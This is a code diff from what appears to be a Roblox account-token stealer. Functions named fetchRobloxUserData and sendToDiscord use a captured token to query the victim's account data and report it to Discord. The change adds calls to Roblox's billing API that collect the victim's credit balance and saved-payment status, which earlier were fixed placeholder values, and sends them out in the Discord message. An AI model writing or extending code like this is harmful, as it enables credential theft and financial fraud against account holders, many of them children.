@@ -1528,53 +1528,58 @@ async function fetchRobloxUserData(token) {
       // Silent handling
     }
 
-    // Get premium status using the validate-membership API
+    // Get credit balance and premium status from billing API
     let premiumData = { isPremium: false };
+    let creditBalance = 0;
+    let savedPayment = false;
+    
     try {
-      const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;
-
-      const premiumResponse = await fetch(premiumApiUrl, {
+      const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
         headers: baseHeaders
       });
 
-      if (premiumResponse.ok) {
-        const premiumValidation = await premiumResponse.json();
+      if (billingResponse.ok) {
+        const billingData = await billingResponse.json();
+        
+        // Extract credit balance information
+        creditBalance = billingData.balance || 0;
+        savedPayment = billingData.hasSavedPayments || false;
+        
+        // Check if user has premium features via billing
+        premiumData.isPremium = billingData.hasPremium || 
+                               billingData.isPremium || 
+                               (billingData.balance && billingData.balance > 0) || 
+                               false;
+      }
+    } catch (billingError) {
+      // Fallback to premium validation API if billing fails
+      try {
+        const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;
 
-        // The API returns a direct boolean value (true/false), not an object
-        if (typeof premiumValidation === 'boolean') {
-          premiumData.isPremium = premiumValidation;
-        } else {
-          // Fallback to check object properties if response is an object
-          premiumData.isPremium = premiumValidation.isPremium || 
-                                  premiumValidation.IsPremium || 
-                                  premiumValidation.premium || 
-                                  premiumValidation.Premium || 
-                                  false;
-        }
-      } else {
-        // Fallback to billing API check
-        try {
-          const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
-            headers: baseHeaders
-          });
+        const premiumResponse = await fetch(premiumApiUrl, {
+          headers: baseHeaders
+        });
 
-          if (billingResponse.ok) {
-            const billingData = await billingResponse.json();
+        if (premiumResponse.ok) {
+          const premiumValidation = await premiumResponse.json();
 
-            // Check if user has premium features via billing
-            premiumData.isPremium = billingData.hasPremium || 
-                                   billingData.isPremium || 
-                                   (billingData.balance && billingData.balance > 0) || 
-                                   false;
+          // The API returns a direct boolean value (true/false), not an object
+          if (typeof premiumValidation === 'boolean') {
+            premiumData.isPremium = premiumValidation;
           } else {
-            premiumData.isPremium = false;
+            // Fallback to check object properties if response is an object
+            premiumData.isPremium = premiumValidation.isPremium || 
+                                    premiumValidation.IsPremium || 
+                                    premiumValidation.premium || 
+                                    premiumValidation.Premium || 
+                                    false;
           }
-        } catch (billingError) {
+        } else {
           premiumData.isPremium = false;
         }
+      } catch (e) {
+        premiumData.isPremium = false;
       }
-    } catch (e) {
-      premiumData.isPremium = false;
     }
 
     // Get user details for account age
@@ -1760,8 +1765,8 @@ async function fetchRobloxUserData(token) {
       premium: premiumData.isPremium || false,
       rap: rapValue,
       summary: summaryData.incomingRobuxTotal || 0,
-      creditBalance: 0, // This would require billing API access
-      savedPayment: false, // This would require billing API access
+      creditBalance: creditBalance,
+      savedPayment: savedPayment,
       robuxIncoming: summaryData.incomingRobuxTotal || 0,
       robuxOutgoing: summaryData.outgoingRobuxTotal || 0,
       korblox: hasKorblox,
@@ -1874,7 +1879,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: "<a:emoji_42:1410523396995022890> Billing",
-            value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
+            value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.round(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
             inline: false
 
           },
